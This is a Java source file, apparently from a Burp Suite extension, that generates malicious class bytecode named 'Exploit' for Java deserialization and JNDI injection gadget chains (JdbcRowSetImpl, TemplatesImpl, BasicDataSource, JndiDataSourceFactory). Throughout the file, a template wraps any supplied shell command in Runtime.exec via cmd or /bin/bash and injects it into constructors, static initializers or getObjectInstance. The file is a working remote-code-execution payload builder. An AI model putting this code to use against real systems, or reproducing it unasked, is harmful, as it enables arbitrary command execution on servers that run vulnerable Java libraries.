package burp.gadget;

import javassist.*;

public class Gadget {


    public static String getInsertCode(String command){
        String source = "";

        String tpl = "try {\n" +
                "            String cmd = \"" + command + "\";\n" +
                "            String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\")\n" +
                "                    ? new String[]{\"cmd\", \"/c\", cmd}\n" +
                "                    : new String[]{\"/bin/bash\", \"-c\", cmd};\n" +
                "            java.lang.Process pc = Runtime.getRuntime().exec(cmds);\n" +
                "            pc.waitFor();\n" +
                "        }catch (Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }";

        source = tpl;


        return source;
    }

    public static byte[] getJdbcRowSetImplExpCode(String command){
        try {
            String code = getInsertCode(command);

            ClassPool classPool = ClassPool.getDefault();
            final CtClass clazz = classPool.get(Default.class.getName());
            clazz.setName("Exploit");
            CtConstructor ctConstructor = clazz.getDeclaredConstructor(null);
            code = String.format("{%s}",code);
            ctConstructor.setBody(code);

            final byte[] classBytes = clazz.toBytecode();
            return classBytes;
        }catch (Exception e){
            e.printStackTrace();
            return null;
        }
    }



    public static byte[] getJndiDataSourceFactory1ExpCode(String command)  {
        try {
            String code = getInsertCode(command);
            ClassPool classPool = ClassPool.getDefault();
            // 获取class
            //System.out.println("ClassName: " + DasicDataSource.class.getName());
            final CtClass clazz = classPool.get(JndiDataSourceFactory1.class.getName());

//            // 插入静态代码块，在代码末尾。
//            clazz.makeClassInitializer().insertAfter(
//                    "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\"") + "\");"
//            );

            CtMethod ctMethod = clazz.getDeclaredMethod("getObjectInstance");
            code = String.format("{%s\nreturn null;}",code);
            //System.out.println(code);
            ctMethod.setBody(code);

            clazz.setName("Exploit");//类的名称，可以通过它修改。
            clazz.writeFile("/tmp");//将生成的.class文件保存到磁盘
            // 获取bytecodes
            final byte[] classBytes = clazz.toBytecode();
            return classBytes;

        }catch (Exception e){
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] getTemplatesImpl1ExpCode(String command){
        try {
            String code = getInsertCode(command);

            ClassPool classPool = ClassPool.getDefault();
            final CtClass clazz = classPool.get(TemplatesImpl1.class.getName());
            CtConstructor ctConstructor = clazz.getDeclaredConstructor(null);
            ctConstructor.setBody("{}");

            code = String.format("{%s}",code);
            ctConstructor.setBody(code);
            clazz.setName("Exploit");
            final byte[] classBytes = clazz.toBytecode();
            return classBytes;
        }catch (Exception e){
            e.printStackTrace();
            return null;
        }
    }

    public static byte[] getTemplatesImpl2ExpCode(String command){
        try {
            String code = getInsertCode(command);

            ClassPool classPool = ClassPool.getDefault();
            final CtClass clazz = classPool.get(TemplatesImpl2.class.getName());
            CtConstructor ctConstructor = clazz.getDeclaredConstructor(null);
            ctConstructor.setBody("{}");

            code = String.format("{%s}",code);
            ctConstructor.setBody(code);
            clazz.setName("Exploit");
            final byte[] classBytes = clazz.toBytecode();
            return classBytes;
        }catch (Exception e){
            e.printStackTrace();
            return null;
        }
    }

    /**
     *
     * https://github.com/bit4woo/Java_deserialize_vuln_lab/blob/master/src/Step6EvilClass/createEvilClass.java
     *
     * @param command
     * @return
     */
    public static byte[] getBasicDataSource1ExpCode(String command){
        try {
            String code = getInsertCode(command);
            ClassPool classPool = ClassPool.getDefault();
            final CtClass clazz = classPool.get(Default.class.getName());

            CtConstructor ci = clazz.makeClassInitializer();
            ci.setBody(code);

            clazz.setName("Exploit");
//            clazz.writeFile("test");
            final byte[] classBytes = clazz.toBytecode();
            return classBytes;
        }catch (Exception e){
            e.printStackTrace();
            return null;
        }
    }

    public static void main(String[] args) {
        Gadget.getBasicDataSource1ExpCode("ifconfig");
    }
}
